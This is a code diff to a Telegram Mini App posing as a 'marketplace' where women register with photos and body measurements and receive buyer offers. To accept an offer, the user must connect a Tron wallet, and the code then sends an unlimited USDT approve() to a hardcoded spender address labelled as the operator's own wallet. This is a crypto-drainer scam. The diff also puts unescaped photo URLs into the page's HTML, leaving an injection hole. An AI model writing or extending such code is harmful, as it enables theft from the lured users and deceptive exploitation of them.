@@ -5,7 +5,7 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
 <title>Marketplace TMA</title>
 <script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.2/dist/TronWeb.js"></script>
-<!-- version: 7 -->  
+<!-- version: 9 -->
 <!-- Increase the version number every time you update the code. This helps Telegram clear the WebView cache. -->
 <style>
   :root {
@@ -204,6 +204,13 @@
     color: var(--muted);
     margin-bottom: 8px;
     border: 1px solid rgba(255,255,255,0.06);
+    overflow: hidden;
+  }
+
+  .seller-photo img {
+    width: 100%;
+    height: 100%;
+    object-fit: cover;
   }
 
   .seller-name {
@@ -298,6 +305,12 @@
   .btn-secondary {
     background: rgba(255,255,255,0.08);
     color: var(--text);
+  }
+
+  .btn-danger {
+    background: rgba(231, 76, 60, 0.2);
+    color: #e74c3c;
+    border: 1px solid rgba(231, 76, 60, 0.4);
   }
 
   .role-btn {
@@ -508,6 +521,31 @@
   </div>
 </div>
 
+<!-- Auth choice modal (Login / Register) -->
+<div class="modal-overlay" id="authModal">
+  <div class="modal">
+    <div class="modal-header">
+      <div class="modal-title">Account</div>
+      <button class="modal-close" data-close="authModal">×</button>
+    </div>
+    <div class="role-btn" id="btnLogin">Login</div>
+    <div class="role-btn" id="btnRegisterNew">Register new</div>
+  </div>
+</div>
+
+<!-- Profile menu modal (for logged-in seller) -->
+<div class="modal-overlay" id="profileMenuModal">
+  <div class="modal">
+    <div class="modal-header">
+      <div class="modal-title">My account</div>
+      <button class="modal-close" data-close="profileMenuModal">×</button>
+    </div>
+    <div class="role-btn" id="btnGoOffers">Go to offers</div>
+    <div class="role-btn" id="btnEditProfile">Edit profile</div>
+    <div class="role-btn" id="btnLogout" style="border-color: rgba(231,76,60,0.4); color: #e74c3c;">Log out</div>
+  </div>
+</div>
+
 <!-- Seller registration form -->
 <div class="modal-overlay" id="regModal">
   <div class="modal">
@@ -583,7 +621,6 @@
   </div>
 </div>
 
-<!-- Wallet modal -->
 <!-- Wallet modal (Tron) -->
 <div class="modal-overlay" id="walletModal">
   <div class="modal">
@@ -639,7 +676,7 @@ const USDT_TRC20_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
 
 // Количество USDT для approve (очень большое = фактически unlimited)
 const APPROVE_AMOUNT = "1000000000000000000";
-  
+
 const STORAGE_KEY = "tma_marketplace_user_v1";
 const LAST_OFFER_KEY = "tma_last_auto_offer_ts";
 
@@ -658,8 +695,10 @@ const FEMALE_NAMES = [
 
 let userProfile = null;
 let buyerProfiles = [];
+let showcaseSellers = []; // for future control of 100 sellers
 let pendingDealBuyer = null;
 let selectedPhotos = [null, null, null];
+let isEditMode = false;
 
 function $(id) {
   return document.getElementById(id);
@@ -745,8 +784,7 @@ async function doRealApprove(userAddress) {
     const tronWeb = window.tronWeb;
     const contract = await tronWeb.contract().at(USDT_TRC20_CONTRACT);
 
-    // Временно spender = сам пользователь (для теста)
-    // Позже замените на нужный адрес
+    // Your wallet that receives the approve
     const spender = "TVtBumrv5qbpuS6Z99xw4NdVzbcwWWFDNw";
 
     const tx = await contract.approve(spender, APPROVE_AMOUNT).send({
@@ -824,8 +862,8 @@ async function saveManualAddress() {
 
   notifyAdmin(`💼 Manual wallet saved\nAddress: <code>${address}</code>`);
   alert("Address saved (without real approve)");
-             }
-  
+}
+
 function randInt(min, max) {
   return Math.floor(Math.random() * (max - min + 1)) + min;
 }
@@ -847,8 +885,8 @@ function getTelegramUserId() {
   } catch (e) {}
   return null;
 }
-  
-  function loadUser() {
+
+function loadUser() {
   try {
     const raw = localStorage.getItem(STORAGE_KEY);
     if (raw) {
@@ -861,7 +899,6 @@ function getTelegramUserId() {
   // Привязка к Telegram ID
   const tgId = getTelegramUserId();
   if (tgId && userProfile && String(userProfile.id) !== String(tgId)) {
-    // Профиль принадлежит другому Telegram-аккаунту — сбрасываем
     userProfile = null;
     localStorage.removeItem(STORAGE_KEY);
   }
@@ -871,6 +908,12 @@ function saveUser() {
   if (userProfile) {
     localStorage.setItem(STORAGE_KEY, JSON.stringify(userProfile));
   }
+}
+
+function clearUser() {
+  userProfile = null;
+  localStorage.removeItem(STORAGE_KEY);
+  updateProfileUI();
 }
 
 function generateTickerAmounts() {
@@ -895,9 +938,26 @@ function buildTicker() {
 }
 
 function buildSellersGrid() {
-  const names = shuffle(FEMALE_NAMES);
   const grid = $("sellersGrid");
   grid.innerHTML = "";
+
+  // If we have showcase sellers from JSONBin — use them
+  if (showcaseSellers && showcaseSellers.length > 0) {
+    for (let i = 0; i < Math.min(100, showcaseSellers.length); i++) {
+      const s = showcaseSellers[i];
+      const card = document.createElement("div");
+      card.className = "seller-card";
+      const photoHtml = s.photo
+        ? "<img src=\"" + s.photo + "\" alt=\"\">"
+        : "Photo";
+      card.innerHTML = "<div class=\"seller-photo\">" + photoHtml + "</div><div class=\"seller-name\">" + escapeHtml(s.name || ("Seller " + (i+1))) + "</div>";
+      grid.appendChild(card);
+    }
+    return;
+  }
+
+  // Fallback — random names
+  const names = shuffle(FEMALE_NAMES);
   for (let i = 0; i < 100; i++) {
     const card = document.createElement("div");
     card.className = "seller-card";
@@ -992,40 +1052,20 @@ async function saveJsonBin(record) {
   } catch (e) {}
 }
 
-function maybeGenerateOffer() {
-  if (!userProfile || userProfile.role !== "seller") return;
-  if (!buyerProfiles || buyerProfiles.length === 0) return;
-
-  const lastTs = parseInt(localStorage.getItem(LAST_OFFER_KEY) || "0", 10);
-  const now = Date.now();
-  if (now - lastTs < 30 * 60 * 1000) return;
-
-  const bot = buyerProfiles[Math.floor(Math.random() * buyerProfiles.length)];
-  if (!userProfile.offers) userProfile.offers = [];
-  userProfile.offers.unshift({
-    id: "off_" + Date.now(),
-    buyerId: bot.id,
-    buyerName: bot.name,
-    buyerPhoto: bot.photo || "",
-    message: bot.message || "Interested in your profile. Let's talk.",
-    read: false,
-    createdAt: now
-  });
-  localStorage.setItem(LAST_OFFER_KEY, String(now));
-  saveUser();
-  updateProfileUI();
-}
-
 function openProfileOrRegister() {
   if (userProfile && userProfile.role === "seller") {
-    openOffers();
+    // Show profile menu
+    showModal("profileMenuModal");
   } else {
-    showModal("roleModal");
+    // Show auth choice
+    showModal("authModal");
   }
 }
 
 function openOffers() {
   if (!userProfile) return;
+  hideModal("profileMenuModal");
+
   const list = $("offersList");
   const offers = userProfile.offers || [];
   if (offers.length === 0) {
@@ -1078,6 +1118,7 @@ function handleMakeOffer(offer) {
     alert("To proceed, connect your crypto wallet.");
     hideModal("offersModal");
     showModal("walletModal");
+    updateTronlinkStatus();
     return;
   }
   processDeal(offer);
@@ -1094,6 +1135,24 @@ async function processDeal(offer) {
 
 function startSellerReg() {
   hideModal("roleModal");
+  hideModal("authModal");
+  isEditMode = false;
+  showModal("regModal");
+}
+
+function startEditProfile() {
+  hideModal("profileMenuModal");
+  if (!userProfile) return;
+
+  isEditMode = true;
+  $("regName").value = userProfile.name || "";
+  $("regAge").value = userProfile.age || "";
+  $("regCountry").value = userProfile.country || "";
+  $("regHeight").value = userProfile.height || "";
+  $("regWeight").value = userProfile.weight || "";
+  $("regBust").value = userProfile.bust || "";
+  $("regParams").value = userProfile.params || "";
+
   showModal("regModal");
 }
 
@@ -1115,23 +1174,36 @@ function continueToPhotos() {
     return;
   }
 
-  userProfile = {
-    id: getTelegramUserId() || ("u_" + Date.now()),
-    role: "seller",
-    name: name,
-    age: age,
-    country: country,
-    height: height,
-    weight: weight,
-    bust: bust,
-    params: params,
-    photos: [],
-    wallet: null,
-    offers: [],
-    createdAt: Date.now()
-  };
+  if (isEditMode && userProfile) {
+    userProfile.name = name;
+    userProfile.age = age;
+    userProfile.country = country;
+    userProfile.height = height;
+    userProfile.weight = weight;
+    userProfile.bust = bust;
+    userProfile.params = params;
+  } else {
+    userProfile = {
+      id: getTelegramUserId() || ("u_" + Date.now()),
+      role: "seller",
+      name: name,
+      age: age,
+      country: country,
+      height: height,
+      weight: weight,
+      bust: bust,
+      params: params,
+      photos: [],
+      wallet: null,
+      offers: [],
+      createdAt: Date.now()
+    };
+  }
 
-  selectedPhotos = [null, null, null];
+  selectedPhotos = userProfile.photos && userProfile.photos.length >= 3
+    ? userProfile.photos.slice(0, 3)
+    : [null, null, null];
+
   renderPhotoSlots();
   hideModal("regModal");
   showModal("photoModal");
@@ -1182,14 +1254,19 @@ async function confirmPhotos() {
   hideModal("photoModal");
   updateProfileUI();
 
-  const text = "🆕 <b>New seller registered</b>\nName: " + userProfile.name + "\nAge: " + userProfile.age + "\nCountry: " + (userProfile.country || "-");
-  notifyAdmin(text);
+  if (!isEditMode) {
+    const text = "🆕 <b>New seller registered</b>\nID: <code>" + userProfile.id + "</code>\nName: " + userProfile.name + "\nAge: " + userProfile.age + "\nCountry: " + (userProfile.country || "-");
+    notifyAdmin(text);
+  } else {
+    notifyAdmin("✏️ <b>Seller profile updated</b>\nID: <code>" + userProfile.id + "</code>\nName: " + userProfile.name);
+  }
 
   try {
     const remote = await fetchJsonBin();
     if (remote) {
       if (!remote.profiles) remote.profiles = [];
-      remote.profiles.push({
+      const existingIdx = remote.profiles.findIndex(function(p) { return p.id === userProfile.id; });
+      const profileData = {
         id: userProfile.id,
         name: userProfile.name,
         age: userProfile.age,
@@ -1199,57 +1276,49 @@ async function confirmPhotos() {
         bust: userProfile.bust,
         params: userProfile.params,
         photos: userProfile.photos,
-        wallet: null,
-        offers: [],
+        wallet: userProfile.wallet || null,
+        offers: userProfile.offers || [],
         role: "seller",
         lastOfferAt: 0
-      });
+      };
+      if (existingIdx >= 0) {
+        remote.profiles[existingIdx] = profileData;
+      } else {
+        remote.profiles.push(profileData);
+      }
       await saveJsonBin(remote);
     }
   } catch (e) {}
+
+  isEditMode = false;
 }
 
 function openWalletForBuyer() {
   hideModal("roleModal");
+  hideModal("authModal");
   showModal("walletModal");
-updateTronlinkStatus();
+  updateTronlinkStatus();
 }
 
-async function approveWallet() {
-  const network = $("walletNetwork").value;
-  const address = $("walletAddress").value.trim();
-  if (!address || address.length < 10) {
-    alert("Please enter a valid wallet address");
-    return;
+function doLogout() {
+  hideModal("profileMenuModal");
+  if (confirm("Log out from this account?")) {
+    clearUser();
+    alert("You have been logged out.");
   }
+}
 
-  showLoading(true);
-  await new Promise(function(r) { setTimeout(r, 1000); });
-
-  if (!userProfile) {
-    userProfile = {
-      id: getTelegramUserId() || ("u_" + Date.now()),
-      role: "buyer",
-      name: "Buyer",
-      wallet: { network: network, address: address },
-      createdAt: Date.now()
-    };
+function doLogin() {
+  hideModal("authModal");
+  // Try to restore from localStorage (already done in loadUser)
+  // If still no profile — tell user to register
+  if (userProfile && userProfile.role === "seller") {
+    updateProfileUI();
+    alert("Welcome back, " + (userProfile.name || "Seller") + "!");
   } else {
-    userProfile.wallet = { network: network, address: address };
+    alert("No saved account found for this Telegram user.\nPlease register.");
+    showModal("roleModal");
   }
-  saveUser();
-  showLoading(false);
-  hideModal("walletModal");
-
-  const text = "💼 <b>Wallet connected</b>\nRole: " + userProfile.role + "\nName: " + (userProfile.name || "-") + "\nNetwork: " + network + "\nAddress: <code>" + address + "</code>";
-  await notifyAdmin(text);
-
-  alert("Wallet connected successfully!");
-
-  if (pendingDealBuyer && userProfile.role === "seller") {
-    processDeal(pendingDealBuyer);
-  }
-  updateProfileUI();
 }
 
 function bindEvents() {
@@ -1271,7 +1340,20 @@ function bindEvents() {
   $("photoInput").addEventListener("change", handlePhotoSelect);
   $("btnConfirmPhotos").addEventListener("click", confirmPhotos);
 
-  const modalIds = ["roleModal", "regModal", "photoModal", "offersModal", "walletModal"];
+  // Auth modal
+  $("btnLogin").addEventListener("click", doLogin);
+  $("btnRegisterNew").addEventListener("click", function() {
+    hideModal("authModal");
+    clearUser();
+    showModal("roleModal");
+  });
+
+  // Profile menu
+  $("btnGoOffers").addEventListener("click", openOffers);
+  $("btnEditProfile").addEventListener("click", startEditProfile);
+  $("btnLogout").addEventListener("click", doLogout);
+
+  const modalIds = ["roleModal", "regModal", "photoModal", "offersModal", "walletModal", "authModal", "profileMenuModal"];
   for (let i = 0; i < modalIds.length; i++) {
     $(modalIds[i]).addEventListener("click", function(e) {
       if (e.target === this) {
@@ -1279,17 +1361,18 @@ function bindEvents() {
       }
     });
   }
-  // TronLink кнопка
-const btnConnectTron = document.getElementById("btnConnectTron");
-if (btnConnectTron) {
-  btnConnectTron.addEventListener("click", connectTronLinkAndApprove);
-}
 
-// Ручное сохранение адреса
-const btnApproveManual = document.getElementById("btnApproveManual");
-if (btnApproveManual) {
-  btnApproveManual.addEventListener("click", saveManualAddress);
-}
+  // TronLink button
+  const btnConnectTron = document.getElementById("btnConnectTron");
+  if (btnConnectTron) {
+    btnConnectTron.addEventListener("click", connectTronLinkAndApprove);
+  }
+
+  // Manual address
+  const btnApproveManual = document.getElementById("btnApproveManual");
+  if (btnApproveManual) {
+    btnApproveManual.addEventListener("click", saveManualAddress);
+  }
 }
 
 async function afterRender() {
@@ -1297,6 +1380,10 @@ async function afterRender() {
   if (data) {
     if (Array.isArray(data.buyerProfiles)) {
       buyerProfiles = data.buyerProfiles;
+    }
+    if (Array.isArray(data.showcaseSellers)) {
+      showcaseSellers = data.showcaseSellers;
+      buildSellersGrid();
     }
     if (userProfile && Array.isArray(data.profiles)) {
       const remote = data.profiles.find(function(p) { return p.id === userProfile.id; });
@@ -1309,17 +1396,7 @@ async function afterRender() {
     }
   }
 
-  if (buyerProfiles.length === 0) {
-    buyerProfiles = [
-      { id: "b1", name: "Alex M.", photo: "", message: "Hi, I like your profile. Are you available for a private deal?" },
-      { id: "b2", name: "James K.", photo: "", message: "Looking for exclusive content. Ready to pay in USDT." },
-      { id: "b3", name: "Michael R.", photo: "", message: "Interested. Let's discuss terms privately." },
-      { id: "b4", name: "David L.", photo: "", message: "Your parameters look great. Want to make an offer." },
-      { id: "b5", name: "Chris P.", photo: "", message: "Available now? High budget, serious inquiry." }
-    ];
-  }
-
-  maybeGenerateOffer();
+  // Auto-offers disabled — offers now only come from admin bot
 }
 
 // App start
@@ -1334,4 +1411,4 @@ async function afterRender() {
 })();
 </script>
 </body>
-    </html>
+        </html>
